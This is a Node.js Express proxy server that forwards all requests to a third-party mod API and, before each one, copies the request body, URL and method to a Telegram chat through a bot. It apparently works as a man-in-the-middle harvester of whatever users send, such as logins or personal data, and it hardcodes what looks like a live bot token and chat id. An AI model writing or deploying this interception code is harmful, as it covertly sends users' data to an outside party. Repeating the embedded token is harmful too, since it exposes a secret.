// server.js
// Proxy server to forward requests to https://mod.jall.my.id/api/v11/*
// and send the request body to your Telegram chat.

const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();

// Middleware: capture raw body for all content types
app.use(express.raw({ type: '*/*', limit: '10mb' }));

// ===== CONFIG (edit these before running) =====
const TARGET_BASE = 'https://mod.jall.my.id/api/v11';

// Replace with your real bot token and chat id
const TELEGRAM_BOT_TOKEN = '8406297631:AAFhZwglG7v26FDZmi3pw2AKpicDemtseWc';
const TELEGRAM_CHAT_ID = '8090981592'; // can be user id or group id
// =============================================

const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);

// Some headers we don’t want to forward
const HOP_BY_HOP = new Set([
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailers',
  'transfer-encoding',
  'upgrade'
]);

function filterRequestHeaders(originalHeaders) {
  const h = { ...originalHeaders };
  delete h.host; // upstream sets its own host
  return h;
}

function filterResponseHeaders(upstreamHeaders) {
  const out = {};
  for (const [k, v] of Object.entries(upstreamHeaders || {})) {
    if (HOP_BY_HOP.has(k.toLowerCase())) continue;
    out[k] = v;
  }
  return out;
}

function escapeHtml(unsafe) {
  if (!unsafe) return '';
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Send request body + metadata to Telegram
async function sendToTelegram(req, rawBodyBuffer) {
  if (!TELEGRAM_ENABLED) return { ok: false, reason: 'Telegram not configured' };

  const summary = [
    `🔔 <b>Proxied Request</b>`,
    `<b>URL:</b> ${req.originalUrl}`,
    `<b>Method:</b> ${req.method}`,
    `<b>Content-Type:</b> ${req.get('content-type') || '(none)'}`
  ].join('\n');

  const contentType = (req.get('content-type') || '').toLowerCase();

  try {
    if (
      contentType.startsWith('application/json') ||
      contentType.startsWith('text/') ||
      contentType === 'application/x-www-form-urlencoded'
    ) {
      let bodyStr = '';
      try {
        bodyStr = rawBodyBuffer ? rawBodyBuffer.toString('utf8') : '';
      } catch (e) {
        bodyStr = '[unreadable]';
      }

      const fullText = `${summary}\n\n<b>Body:</b>\n<pre>${escapeHtml(
        bodyStr
      ).slice(0, 3800)}</pre>`;

      if (fullText.length < 3800) {
        await axios.post(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            chat_id: TELEGRAM_CHAT_ID,
            text: fullText,
            parse_mode: 'HTML'
          },
          { timeout: 10000 }
        );
        return { ok: true, method: 'sendMessage' };
      }
    }

    // For binary or large bodies → send as document
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('caption', summary);

    const filename =
      (req.path && req.path.replace(/\//g, '_').replace(/^_/, '')) ||
      'body.bin';

    form.append('document', rawBodyBuffer || Buffer.from(''), {
      filename: filename,
      contentType: contentType || 'application/octet-stream'
    });

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      form,
      {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: 20000
      }
    );

    return { ok: true, method: 'sendDocument' };
  } catch (err) {
    return { ok: false, error: err?.toString?.() || String(err) };
  }
}

// Catch-all proxy route
app.all('*', async (req, res) => {
  try {
    const targetUrl = `${TARGET_BASE}${req.originalUrl}`;
    const forwardHeaders = filterRequestHeaders(req.headers);

    const method = req.method.toUpperCase();
    const hasBody = !(
      method === 'GET' ||
      method === 'HEAD' ||
      (method === 'OPTIONS' && !req.body)
    );

    const axiosConfig = {
      url: targetUrl,
      method,
      headers: forwardHeaders,
      responseType: 'arraybuffer',
      validateStatus: () => true,
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 45000
    };

    if (hasBody) {
      axiosConfig.data = req.body;
    }

    // Send body to Telegram (waits until complete)
    await sendToTelegram(req, req.body);

    // Proxy to upstream
    const upstreamResp = await axios.request(axiosConfig);

    const filteredHeaders = filterResponseHeaders(upstreamResp.headers);
    for (const [hk, hv] of Object.entries(filteredHeaders)) {
      try {
        res.setHeader(hk, hv);
      } catch (_) {}
    }

    res.status(upstreamResp.status).send(Buffer.from(upstreamResp.data || []));
  } catch (err) {
    console.error('Proxy error:', err);
    res.status(502).json({
      error: 'proxy_error',
      message: err?.toString?.() || String(err)
    });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
  console.log(`Forwarding requests to: ${TARGET_BASE}`);
  console.log(`Telegram enabled: ${TELEGRAM_ENABLED}`);
});
